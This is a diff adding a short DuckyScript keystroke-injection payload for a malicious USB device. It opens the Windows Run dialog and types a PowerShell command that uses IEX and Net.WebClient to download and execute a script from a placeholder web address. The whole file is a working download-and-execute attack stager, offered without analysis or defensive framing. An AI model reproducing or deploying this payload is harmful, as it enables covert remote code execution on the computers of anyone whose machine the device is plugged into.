@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('PAYLOAD_WEB_ADDRESS');"
+ENTER
